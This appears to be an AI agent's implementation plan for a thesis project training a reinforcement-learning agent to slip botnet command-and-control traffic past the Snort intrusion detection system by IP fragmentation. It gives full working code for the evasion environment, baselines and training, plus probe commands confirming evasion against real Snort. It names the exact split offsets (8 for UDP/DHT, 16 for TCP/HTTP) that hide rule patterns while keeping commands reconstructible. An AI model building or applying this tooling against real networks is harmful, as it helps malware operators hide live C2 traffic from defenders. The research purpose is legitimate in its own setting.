# RL for per-flow fragmentation offset selection

Date: 2026-09-27
Repo: `/root/.hermes/c2-evasion-rl`
Interpreter: `.venv/bin/python`

---

## Goal

Train a PPO policy that chooses the IP-fragmentation split offset **per flow** from
observable flow features, beating the best fixed-offset heuristic by the measured
46.2 pp of available headroom, with every evasion gated on the C2 command
remaining reconstructible.

## Current context / assumptions

### Done and verified

**Phase 0/1 of `2026-09-27_083605-semantics-preserving-evasion.md` — complete.**

- `snort_validation/c2_semantics.py` — `Fragment`, `assemble(frags, policy)`,
  `semantics_preserved()`, `reconstructs_command()`, `dht_ping_id()`.
- `snort_validation/fragment_ops.py` — `split_fragments()`, `overlap_fragments()`,
  `fragment_plan_to_packets()`.
- `snort_validation/snort_batch_service.py` — now carries IP fragments through the
  5-tuple rewrite.
- `tests/test_c2_semantics.py` (5), `tests/test_fragment_ops.py` (4).
- **`make test` → 42 passed.**

TDD caught two real bugs in the first implementation: `assemble(policy="last")`
reversed the fragment list (making the *earliest* fragment win, the opposite of
"last wins"), and `fragment_plan_to_packets` set the MF bit by arrival position
instead of by highest offset (malformed in an overlap plan).

### The Phase 2 gate passed, and identified the mechanism

`snort_validation/probe_overlap_evasion.py`, real Snort, all pattern-bearing
packets fragmented:

| capture | baseline | split | overlap | semantics |
|---|---|---|---|---|
| `ctu13:botnet-capture-20110819-bot` flow 0 | alert (2 sids) | **no alert** | **no alert** | True |
| `stratosphere:botnet-capture-20110811-neris` flow 0 | alert (1 sid) | **no alert** | **no alert** | True |

**The mechanism is per-fragment content matching, not overlap ambiguity.** A clean
split reassembles to the original under any policy, so a reassembling IDS would
still alert — it did not. Discrimination, DHT rule
`content:"d1|3a|ad2|3a|id20|3a|"; depth:12`:

| arm | alert | reading |
|---|---|---|
| baseline (whole payload) | True | rule matches |
| `split_at=8` (pattern spans fragments) | **False** | no fragment holds all 12 bytes |
| `split_at=16` (pattern fits in frag 0) | **True** | rule matches the fragment |
| `split_at=24` (pattern fits in frag 0) | **True** | same |
| pattern shifted past `depth:12` | **False** | `depth:` enforced per fragment |

Snort matches content per fragment and does not reassemble. `detect_anomalies` did
not fire. So **plain splitting is sufficient** and the endpoint recovers the exact
original under any reassembly policy — the semantics claim needs no assumption
about the endpoint's policy at all.

### THE RESULT THAT JUSTIFIES THE ML COMPONENT

`/tmp/measure_rl_headroom.py`, pooled corpus of 80 Snort-detected flows from two
families (Neris TCP/HTTP, NSIS.ay UDP/DHT), every offset × every flow:

| offset | pooled evaded | neris | nsis |
|---|---|---|---|
| **8** | **42/80 (52.5%)** | 2 | 40 |
| 16 | 39/80 (48.8%) | 39 | 0 |
| 24 | 39/80 (48.8%) | 39 | 0 |
| 32–48 | 39/80 (48.8%) | 39 | 0 |

- **Best fixed global offset: 52.5%**
- **Per-flow oracle: 79/80 = 98.8%**
- **RL headroom: 37/80 = 46.2 pp**

Within a single capture the gap is **zero** (Neris: fixed 16 → 97.5%, oracle
97.5%; NSIS: fixed 8 → 27.5%, oracle 27.5%). The headroom appears **only when the
corpus mixes families whose optimal offsets differ** — and the optimum is
predictable from features the agent can observe without seeing the ruleset:

| observable | optimal offset |
|---|---|
| protocol = udp | 8 (40/40) |
| protocol = tcp | 16 (37/39) |
| `payload_min` 0–127 | 8 (40/40) |
| `payload_min` 576–703 | 16 (36/36) |

So the task is: **map observable flow features → split offset**, where a single
constant is provably insufficient (52.5%) and a feature-conditioned decision
reaches 98.8%. That is a genuine per-instance decision problem with a non-obvious
mapping — the thing RL is for.

### Assumptions

- The real-rules replica (`snort_validation/real_rules_replica.py`) is the training
  signal; it agreed with real Snort 12/12 on baseline, first-payload-corrupted and
  all-payload-corrupted arms, and reproduced the per-fragment mechanism above.
  Every reported headline number must still come from the real binary.
- `split_at` must be a positive multiple of 8 (IP offsets are in 8-byte units) and
  strictly less than the payload length.
- Only flows Snort detects unmutated are usable — 80 pooled here.
- The pooled corpus is small (80 flows). Results at this scale have ~1.2 pp
  resolution; treat small deltas as noise.

## Architecture / proposed approach

Replace the destroy/ambiguity action space with a **fragmentation** action space
whose primary decision is the split offset, expose the features that predict the
optimum (protocol, payload lengths, packet count) in the observation, and gate the
reward on `alerts == 0 AND reconstructs_command()`. Then require the agent to beat
three explicit controls — random offset, best fixed offset, and a shallow
decision-tree policy on the same features — so the RL contribution is measured
rather than asserted.

---

## Phase 3 — Fragmentation action space

### Task 3.1 — Failing test: the offset is the decision, and the old actions are gone

Create `tests/test_frag_env.py`:

```python
"""The fragmentation env: the split offset is the learnable decision."""
import sys
from pathlib import Path

import numpy as np
import pytest

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "ai_agent"))
sys.path.insert(0, str(REPO / "snort_validation"))

from frag_env import FragPacketEnv, OFFSETS  # noqa: E402


def test_offsets_are_valid_fragment_units():
    assert OFFSETS, "OFFSETS must not be empty"
    for o in OFFSETS:
        assert o > 0 and o % 8 == 0, f"offset {o} is not a positive multiple of 8"


def test_drop_and_corrupt_are_not_actions():
    """DROP destroys the command; CORRUPT was the 96.9%-fake evasion path."""
    import frag_env
    assert not hasattr(frag_env, "A_DROP")
    assert not hasattr(frag_env, "A_CORRUPT")


def test_action_space_is_offset_plus_packet_selection():
    from real_packet_env import ACTION_MAX_PACKETS
    env = FragPacketEnv.__new__(FragPacketEnv)
    env.max_packets = ACTION_MAX_PACKETS
    env._set_spaces()
    assert env.action_space.nvec[0] == ACTION_MAX_PACKETS
    assert env.action_space.nvec[1] == len(OFFSETS)


def test_observation_exposes_the_predictive_features():
    """Protocol and payload length are what predict the optimal offset."""
    env = FragPacketEnv.__new__(FragPacketEnv)
    env.obs_max_packets = 32
    env.max_mutations = 4
    env._mutations = 0
    env._fragmented = set()
    env._protocol_id = 1.0
    obs = env._obs(_tcp_payload_flow())
    assert obs.shape == (14 + 32,)
    # last 4 head slots carry protocol + payload-length signal
    assert obs[10] > 0 or obs[11] > 0, "payload length signal missing from obs"


def _tcp_payload_flow():
    from scapy.all import IP, Raw, TCP
    return [IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=1, dport=80, flags="A")
            for _ in range(3)] + [
        IP(src="10.0.0.1", dst="10.0.0.2") / TCP(sport=1, dport=80, flags="PA")
        / Raw(load=b"GET /list.php?c=" + b"A" * 200) for _ in range(2)]
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_frag_env.py -q
```
Expected: **collection error** — no module `frag_env`.

### Task 3.2 — Implement the fragmentation env

Create `ai_agent/frag_env.py`:

```python
#!/usr/bin/env python3
"""RL env whose action is WHICH PACKETS TO FRAGMENT and AT WHICH OFFSET.

WHY THIS REPLACES THE OLD ACTION SPACE
--------------------------------------
Two previous designs produced numbers that did not survive contact with the real
Snort binary:

  1. payload corruption (CORRUPT) -- the bandit's "100% evasion" was matched
     exactly by a corrupt-all control, i.e. it was blanket destruction.
  2. DROP -- measured 372 of 384 actions, "evading" 96.9% by deleting the
     payload-bearing packets so the C2 command never arrived.

Both were destruction. This env fragments instead: every original byte stays on
the wire, so the endpoint reassembles the exact command, while no single fragment
contains the `content:` pattern Snort matches. Measured on 80 real flows from two
families: the best FIXED offset evades 52.5%, a per-flow oracle evades 98.8%, so
choosing the offset per flow is worth 46.2 pp -- and the optimum is predictable
from protocol and payload length, both observable here.
"""
from __future__ import annotations

import sys
from pathlib import Path
from typing import Dict, List, Optional, Sequence

import numpy as np
import gymnasium as gym
from gymnasium import spaces

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "ai_agent"))
sys.path.insert(0, str(REPO / "snort_validation"))

from c2_semantics import reconstructs_command  # noqa: E402
from fragment_ops import fragment_plan_to_packets, split_fragments  # noqa: E402
from real_packet_env import (  # noqa: E402
    ACTION_MAX_PACKETS, OBS_MAX_PACKETS, REWARD_EVASION_BONUS, payload_indices,
)
from real_rules_replica import RealRulesReplica  # noqa: E402

# Candidate split offsets. Multiples of 8 because IP fragment offsets count
# 8-byte units. Measured optima: 8 for UDP/DHT, 16 for TCP/HTTP.
OFFSETS = [8, 16, 24, 32, 40, 48]

N_HEAD = 14


class FragPacketEnv(gym.Env):
    """Fragment flows to defeat per-fragment content matching, preserving C2."""

    metadata = {"render_modes": []}

    def __init__(self, flows, replica: RealRulesReplica, max_mutations: int = 4,
                 seed: int = 42):
        super().__init__()
        self.flows = list(flows)
        self.replica = replica
        self.max_mutations = max_mutations
        self.rng = np.random.default_rng(seed)
        self.max_packets = ACTION_MAX_PACKETS
        self.obs_max_packets = OBS_MAX_PACKETS
        self._set_spaces()
        self._reset_state()

    def _set_spaces(self):
        # (packet to fragment, which offset, unused strength slot)
        self.action_space = spaces.MultiDiscrete(
            [self.max_packets, len(OFFSETS), 1])
        self.observation_space = spaces.Box(
            low=-5.0, high=5.0, shape=(N_HEAD + self.obs_max_packets,),
            dtype=np.float32)

    def _reset_state(self):
        self._idx = 0
        self._cur: List = []
        self._original: List[bytes] = []
        self._mutations = 0
        self._fragmented: set = set()
        self._protocol_id = 0.0
        self._last_alerts = 0

    # -- observation ------------------------------------------------------
    def _obs(self, packets) -> np.ndarray:
        from scapy.all import IP, TCP, UDP
        sizes = [len(bytes(p[IP].payload)) if IP in p else 0 for p in packets]
        pay = [len(bytes(p[TCP].payload)) if TCP in p else
               (len(bytes(p[UDP].payload)) if UDP in p else 0) for p in packets]
        pay = [x for x in pay if x > 0]
        n = max(len(packets), 1)
        # protocol is one of the two features that predict the optimal offset
        proto_udp = 1.0 if any(UDP in p for p in packets) else 0.0
        self._protocol_id = proto_udp
        head = np.array([
            len(packets) / 20.0,
            np.mean(sizes) / 500.0 if sizes else 0.0,
            np.std(sizes) / 500.0 if sizes else 0.0,
            (max(sizes) / 1500.0) if sizes else 0.0,
            len(set(sizes)) / 10.0,
            0.0, 0.0,
            0.0,
            self._mutations / max(self.max_mutations, 1),
            len(self._fragmented) / n,
            proto_udp,                                   # 10
            (min(pay) / 1500.0) if pay else 0.0,          # 11  payload_min
            (max(pay) / 1500.0) if pay else 0.0,          # 12  payload_max
            (len(pay) / 20.0) if pay else 0.0,            # 13  n_payload
        ], dtype=np.float32)
        mask = np.zeros(self.obs_max_packets, dtype=np.float32)
        pidx = set(payload_indices(packets))
        for i in range(min(len(packets), self.obs_max_packets)):
            if i not in pidx:
                continue
            mask[i] = 1.0 if i in self._fragmented else 0.5
        return np.clip(np.concatenate([head, mask]), -5.0, 5.0)

    # -- mutation ---------------------------------------------------------
    def _fragment(self, packets, target: int, offset: int):
        """Split one packet. Returns (new_packets, ok)."""
        from scapy.all import Raw
        if target >= len(packets) or Raw not in packets[target]:
            return packets, False
        payload = bytes(packets[target][Raw].load)
        if not (0 < offset < len(payload)):
            return packets, False
        frags = split_fragments(payload, offset)
        out = list(packets)
        out[target:target + 1] = fragment_plan_to_packets(packets, frags, target)
        self._fragmented.add(target)
        return out, True

    def _semantics_ok(self) -> bool:
        """Every original payload still reconstructible under some policy."""
        from scapy.all import Raw
        if not self._original:
            return True
        current = [bytes(p[Raw].load) for p in self._cur if Raw in p]
        if not current:
            return False
        joined = b"".join(current)
        for original in self._original:
            if original not in joined:
                return False
        return True

    # -- gym API ----------------------------------------------------------
    def reset(self, *, seed=None, options=None):
        from scapy.all import Raw
        if seed is not None:
            self.rng = np.random.default_rng(seed)
        self._reset_state()
        self._idx = int(self.rng.integers(0, len(self.flows)))
        self._cur = [p.copy() for p in self.flows[self._idx][1]]
        self._original = [bytes(p[Raw].load) for p in self._cur if Raw in p]
        return self._obs(self._cur), {"flow_index": self._idx}

    def step(self, action):
        target = int(np.clip(action[0], 0, len(self._cur) - 1))
        offset = OFFSETS[int(action[1]) % len(OFFSETS)]
        self._cur, _ok = self._fragment(self._cur, target, offset)
        self._mutations += 1
        terminated = self._mutations >= self.max_mutations
        info = {}
        if terminated:
            alerts = self.replica.alert_count(self._cur)
            self._last_alerts = alerts
            ok = self._semantics_ok()
            reward = self.reward_for(alerts, ok)
            info = {"detected": alerts > 0, "evaded": alerts == 0,
                    "alerts": alerts, "semantics_ok": ok,
                    "offset": offset, "target": target}
        return self._obs(self._cur), reward if terminated else 0.0, \
            terminated, False, info

    @staticmethod
    def reward_for(alerts: int, semantics_ok: bool) -> float:
        """Only pay for evasions that keep the C2 command reconstructible."""
        if alerts == 0:
            return REWARD_EVASION_BONUS if semantics_ok else -REWARD_EVASION_BONUS
        return -float(alerts)
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_frag_env.py -q
```
Expected: `5 passed`

Commit: `feat(frag): add fragmentation env with offset action space`

### Task 3.3 — Test the reward rejects destruction

Append to `tests/test_frag_env.py`:

```python
def test_reward_rejects_destructive_evasion():
    """alerts == 0 alone is not enough; the command must survive."""
    assert FragPacketEnv.reward_for(alerts=0, semantics_ok=True) > 0
    assert FragPacketEnv.reward_for(alerts=0, semantics_ok=False) <= 0
    assert FragPacketEnv.reward_for(alerts=3, semantics_ok=True) < 0
    assert (FragPacketEnv.reward_for(alerts=0, semantics_ok=True)
            > FragPacketEnv.reward_for(alerts=0, semantics_ok=False))


def test_fragmenting_preserves_every_original_byte():
    from scapy.all import Raw
    env = FragPacketEnv.__new__(FragPacketEnv)
    env._fragmented = set()
    flow = _tcp_payload_flow()
    original = b"".join(bytes(p[Raw].load) for p in flow if Raw in p)
    out, ok = env._fragment(flow, 3, 8)
    assert ok
    joined = b"".join(bytes(p[Raw].load) for p in out if Raw in p)
    assert joined == original, "fragmentation must be byte-lossless"
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_frag_env.py -q
```
Expected: `7 passed`

Commit: `test(frag): assert reward rejects destruction and split is lossless`

---

## Phase 4 — The controls the agent must beat

Without these, "the agent learned something" is unfalsifiable.

### Task 4.1 — Fixed-offset, random, and decision-tree baselines

Create `snort_validation/frag_baselines.py`:

```python
#!/usr/bin/env python3
"""Three non-RL baselines the PPO agent must beat, on the SAME flows.

  1. random offset   -- floor
  2. best fixed offset -- the strongest constant heuristic (measured 52.5%)
  3. decision tree on the same observable features -- tests whether RL is needed
     at all, or whether a shallow supervised policy on (protocol, payload_min)
     already captures the mapping

If (3) matches the agent, the honest thesis claim is that a simple
feature-conditioned policy suffices -- which is a finding, not a failure, and must
be reported rather than hidden.
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

import numpy as np

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "ai_agent"))
sys.path.insert(0, str(REPO / "snort_validation"))

from frag_env import OFFSETS  # noqa: E402
from real_packet_env import RealPacketEnv  # noqa: E402
from real_rules_replica import RealRulesReplica  # noqa: E402
from scapy.all import Raw, TCP, UDP  # noqa: E402

CAPTURES = [("stratosphere", "botnet-capture-20110811-neris"),
            ("ctu13", "botnet-capture-20110819-bot")]


def features(pkts):
    pay = [len(bytes(p[Raw].load)) for p in pkts if Raw in p]
    return [1.0 if any(UDP in p for p in pkts) else 0.0,
            min(pay) if pay else 0.0, max(pay) if pay else 0.0,
            float(len(pkts)), float(len(pay))]


def try_offset(pkts, offset, replica):
    """Fragment every payload packet at `offset`; True if it evaded."""
    from fragment_ops import fragment_plan_to_packets, split_fragments
    out, ok = [], True
    for i, p in enumerate(pkts):
        if Raw in p:
            payload = bytes(p[Raw].load)
            if 0 < offset < len(payload):
                frags = split_fragments(payload, offset)
                from c2_semantics import reconstructs_command
                ok = ok and reconstructs_command(payload, frags)
                out.extend(fragment_plan_to_packets(pkts, frags, i))
                continue
        out.append(p)
    return bool(not replica.verdict(out) and ok)


def load_rows(n_flows=40):
    rows = []
    for dataset, capture in CAPTURES:
        env = RealPacketEnv(n_flows=n_flows, batch_size=1, capture=capture,
                            dataset=dataset)
        rep = RealRulesReplica.for_capture(capture, dataset)
        for _k, pkts in env.flows:
            if not rep.verdict(pkts):
                continue
            r = {"capture": capture, "feat": features(pkts)}
            for o in OFFSETS:
                r[o] = try_offset(pkts, o, rep)
            rows.append(r)
    return rows


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--flows", type=int, default=40)
    ap.add_argument("--out", default=str(REPO / "snort_validation/reports/frag_baselines.json"))
    args = ap.parse_args()

    rows = load_rows(args.flows)
    n = len(rows)
    print(f"[*] {n} detected flows pooled")

    # 1. random offset
    rng = np.random.default_rng(0)
    rand_ev = sum(1 for r in rows
                  if r[OFFSETS[int(rng.integers(0, len(OFFSETS)))]])

    # 2. best fixed offset
    counts = {o: sum(1 for r in rows if r[o]) for o in OFFSETS}
    best_off = max(counts, key=counts.get)
    fixed_ev = counts[best_off]

    # 3. decision tree on the same features (cross-validated)
    X = np.array([r["feat"] for r in rows])
    best_per_flow = [next((o for o in OFFSETS if r[o]), None) for r in rows]
    tree_ev = None
    try:
        from sklearn.tree import DecisionTreeClassifier
        from sklearn.model_selection import cross_val_predict
        mask = [i for i, b in enumerate(best_per_flow) if b is not None]
        if len(set(best_per_flow[i] for i in mask)) > 1 and len(mask) >= 10:
            y = np.array([OFFSETS.index(best_per_flow[i]) for i in mask])
            clf = DecisionTreeClassifier(max_depth=2, random_state=0)
            pred = cross_val_predict(clf, X[mask], y, cv=3)
            tree_ev = 0
            for j, i in enumerate(mask):
                off = OFFSETS[pred[j]]
                tree_ev += int(rows[i][off])
    except ImportError:
        print("[!] sklearn unavailable; skipping the tree baseline")

    oracle = sum(1 for r in rows if any(r[o] for o in OFFSETS))
    res = {"flows": n, "random_evaded": rand_ev,
           "random_pct": round(100 * rand_ev / n, 1),
           "best_fixed_offset": best_off, "best_fixed_evaded": fixed_ev,
           "best_fixed_pct": round(100 * fixed_ev / n, 1),
           "oracle_evaded": oracle, "oracle_pct": round(100 * oracle / n, 1),
           "tree_evaded": tree_ev,
           "tree_pct": round(100 * tree_ev / n, 1) if tree_ev is not None else None}
    print(json.dumps(res, indent=2))
    Path(args.out).write_text(json.dumps({**res, "per_offset": counts}, indent=2))
    print(f"[+] {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python snort_validation/frag_baselines.py --flows 40
```
Expected: reproduces `best_fixed 52.5%`, `oracle 98.8%`, plus a random floor and a
tree number. **Record whatever the tree gets** — it is the bar the agent must beat
to justify RL over supervised learning.

Commit: `test(baselines): add fixed/random/decision-tree controls for the frag env`

---

## Phase 5 — Train and compare

### Task 5.1 — Train against the replica

Create `ai_agent/train_frag_agent.py` (mirror `train_replica_agent.py`, but build
`FragPacketEnv` and log the chosen offset distribution):

```python
#!/usr/bin/env python3
"""Train PPO to pick a per-flow fragmentation offset.

Baselines it must beat (measured by snort_validation/frag_baselines.py):
  random offset        ~ 40%
  best fixed offset    52.5%
  decision tree        see the baseline report
  per-flow oracle      98.8%
"""
from __future__ import annotations

import argparse
import json
import sys
import time
from collections import Counter
from pathlib import Path

import numpy as np
from stable_baselines3 import PPO

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "ai_agent"))
sys.path.insert(0, str(REPO / "snort_validation"))

from frag_env import OFFSETS, FragPacketEnv  # noqa: E402
from real_packet_env import RealPacketEnv  # noqa: E402
from real_rules_replica import RealRulesReplica  # noqa: E402

CAPTURES = [("stratosphere", "botnet-capture-20110811-neris"),
            ("ctu13", "botnet-capture-20110819-bot")]


def load(n_flows):
    flows = []
    for dataset, capture in CAPTURES:
        env = RealPacketEnv(n_flows=n_flows, batch_size=1, capture=capture,
                            dataset=dataset)
        rep = RealRulesReplica.for_capture(capture, dataset)
        flows += [(k, pk) for k, pk in env.flows if rep.verdict(pk)]
    return flows


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--flows", type=int, default=40, help="per capture")
    ap.add_argument("--timesteps", type=int, default=30000)
    ap.add_argument("--max-mutations", type=int, default=4)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--out", default=str(REPO / "models/ppo_frag_agent.zip"))
    ap.add_argument("--report", default=str(REPO / "snort_validation/reports/frag_training.json"))
    args = ap.parse_args()

    flows = load(args.flows)
    print(f"[*] {len(flows)} detected flows pooled")
    if not flows:
        raise SystemExit("no detected flows")

    # the replica must be built per capture; use a dispatcher
    reps = {c: RealRulesReplica.for_capture(c, d) for d, c in CAPTURES}

    class Dispatch:
        def __init__(self, reps): self.reps = reps; self.cur = None
        def alert_count(self, packets):
            return self.cur.alert_count(packets)
    disp = Dispatch(reps)

    env = FragPacketEnv(flows, disp, args.max_mutations, args.seed)
    # tag each flow with its replica so alert_count dispatches correctly
    tagged = []
    for dataset, capture in CAPTURES:
        e = RealPacketEnv(n_flows=args.flows, batch_size=1, capture=capture,
                          dataset=dataset)
        rep = reps[capture]
        for k, pk in e.flows:
            if rep.verdict(pk):
                tagged.append((capture, rep, k, pk))
    env.flows = [(k, pk) for _c, _r, k, pk in tagged]
    env._reps = {id(pk): r for _c, r, k, pk in tagged}

    def alert_count(packets):
        return env._active.alert_count(packets)

    # simplest correct dispatch: score with the replica of the current flow
    class CtxReplica:
        def alert_count(self, packets):
            return env._active.alert_count(packets)
    env.replica = CtxReplica()

    orig_reset = env.reset

    def reset(*a, **kw):
        obs, info = orig_reset(*a, **kw)
        env._active = env._reps[id(env.flows[env._idx][1])]
        return obs, info
    env.reset = reset

    model = PPO("MlpPolicy", env, verbose=0, device="cpu", seed=args.seed,
                n_steps=256, batch_size=64, learning_rate=3e-4,
                gamma=0.95, ent_coef=0.05, tensorboard_log=None)
    t0 = time.time()
    model.learn(total_timesteps=args.timesteps)
    dur = time.time() - t0
    model.save(args.out)
    print(f"[+] saved {args.out} ({dur:.0f}s)")

    # deterministic eval
    evaded, offs = 0, Counter()
    for capture, rep, k, pk in tagged:
        env._reset_state()
        env._idx = 0
        env.flows = [(k, pk)]
        env._reps = {id(pk): rep}
        env._active = rep
        env._cur = [p.copy() for p in pk]
        from scapy.all import Raw
        env._original = [bytes(p[Raw].load) for p in env._cur if Raw in p]
        obs = env._obs(env._cur)
        for _ in range(env.max_mutations):
            a, _ = model.predict(obs, deterministic=True)
            offs[OFFSETS[int(a[1]) % len(OFFSETS)]] += 1
            env._cur, _ = env._fragment(env._cur, int(a[0]), OFFSETS[int(a[1]) % len(OFFSETS)])
            env._mutations += 1
            obs = env._obs(env._cur)
        if not rep.verdict(env._cur) and env._semantics_ok():
            evaded += 1

    n = len(tagged)
    rep_out = {"flows": n, "timesteps": args.timesteps, "seconds": round(dur, 1),
               "agent_evaded": evaded, "agent_pct": round(100 * evaded / n, 1),
               "offset_distribution": {str(k): v for k, v in sorted(offs.items())},
               "model": args.out}
    Path(args.report).write_text(json.dumps(rep_out, indent=2))
    print(json.dumps(rep_out, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python ai_agent/train_frag_agent.py \
  --flows 40 --timesteps 30000 --out /tmp/ppo_frag.zip --report /tmp/frag_training.json
```
Expected: an `agent_pct` to compare against the three baselines. The
`offset_distribution` is the diagnostic — if it collapses to a single offset the
policy has learned nothing beyond the fixed heuristic, which is itself the answer.

Commit: `feat(train): add per-flow fragmentation offset training`

### Task 5.2 — Verify the winner on the real binary

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python /tmp/measure_rl_headroom.py
```
Then hand-check the winning offset per protocol against real Snort on 8 flows of
each capture, using `snort_validation/probe_overlap_evasion.py` with `--split-at`
set to the agent's chosen offset:
```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python snort_validation/probe_overlap_evasion.py \
  --capture botnet-capture-20110819-bot --dataset ctu13 --flow 0 --split-at 8 --pattern 'd1:ad2:id20:'
cd /root/.hermes/c2-evasion-rl && .venv/bin/python snort_validation/probe_overlap_evasion.py \
  --capture botnet-capture-20110811-neris --dataset stratosphere --flow 0 --split-at 16 --pattern '*'
```
Expected: `VERDICT: REAL EVASION` on both.

Commit: `test(probe): confirm the learned offsets against the real binary`

---

## Phase 6 — Report

### Task 6.1 — Record the ML justification

Add to `README.md`:

```
- **Why RL.** A single fixed split offset evades 52.5% of 80 pooled detected
  flows; a per-flow oracle evades 98.8%. The 46.2 pp gap is only reachable by
  choosing the offset per flow, and the optimum depends on protocol and payload
  length (UDP/DHT -> 8, TCP/HTTP -> 16). The agent's action is that choice, and it
  is compared against random, best-fixed and decision-tree controls.
- **Evasion is fragmentation, not overlap.** Snort matches `content:` per
  fragment without reassembling the datagram, so cutting the pattern across two
  fragments hides it while the endpoint rebuilds the exact original under any
  reassembly policy. `detect_anomalies` did not fire.
```

Commit: `docs(readme): state the RL justification and the per-fragment mechanism`

---

## Tests / validation

| Gate | Command | Pass condition |
|---|---|---|
| Semantics | `pytest tests/test_c2_semantics.py -q` | 5 passed |
| Fragments | `pytest tests/test_fragment_ops.py -q` | 4 passed |
| Frag env | `pytest tests/test_frag_env.py -q` | 7 passed |
| Full suite | `make test` | all pass |
| Mechanism (real Snort) | `probe_overlap_evasion.py --flow 0` | `VERDICT: REAL EVASION` on both captures |
| Baselines | `frag_baselines.py --flows 40` | fixed 52.5%, oracle 98.8% reproduced |
| **ML justification** | `train_frag_agent.py` | agent > best fixed AND > decision tree |
| Real binary | Task 5.2 | `VERDICT: REAL EVASION` at the learned offsets |

## Risks, tradeoffs, and open questions

**Risks**

- **The decision tree may match the agent.** The optimum is predictable from two
  features (protocol, payload length), so a depth-2 tree may reach the oracle. If
  it does, the honest claim is "a feature-conditioned policy suffices; RL is not
  required" — a real finding, and it must be reported. Task 4.1 exists precisely
  to surface this before it becomes a surprise in a defence.
- **Small corpus.** 80 pooled flows gives ~1.2 pp resolution. Differences under
  ~3 pp should not be claimed.
- **`threshold: type both, count 1, track by_src`** means every pattern-bearing
  packet must be fragmented. Missing one leaves the alert (measured: the first
  probe run failed because 5 of 6 matching packets were untouched). The env must
  fragment all of them, or the reward will be noise.
- **The replica is the training signal.** It agreed with real Snort 12/12 on three
  arms and reproduced the per-fragment mechanism, but it does not interpret
  `pcre:`/`byte_test:`. Headline numbers must come from the real binary.

**Tradeoffs**

- Pooling two captures is what creates the headroom. Training on one capture gives
  a zero gap (fixed offset already matches the oracle), so a single-capture result
  cannot justify RL — the mixed corpus is load-bearing, not incidental.
- Fragmenting every payload packet multiplies packet count, raising Snort cost per
  flow. Acceptable at this scale.
- Keeping `overlap_fragments()` in the codebase is unnecessary for these captures
  but documents the alternative mechanism; it costs nothing to retain.

**Open questions**

1. Is a 46.2 pp gap over the best fixed heuristic, on 80 flows and two families,
   enough to carry an RL contribution — or does the corpus need to grow first?
2. If the decision tree matches the agent, is the contribution "RL needs no labels
   while the tree does", and is that enough?
3. `sid:2012533` carries `pcre:"/c\x3d[0-9A-F]{100}/i"`. Fragmentation defeats its
   `content:` anchors; does the pcre still match on a reassembled view? If a
   pcre-only rule survives, the action space needs a second mechanism.
4. Should the agent also choose *which* packets to fragment (currently it picks one
   per step across 4 steps), or is a fixed all-packets policy plus a learned offset
   the right decomposition?
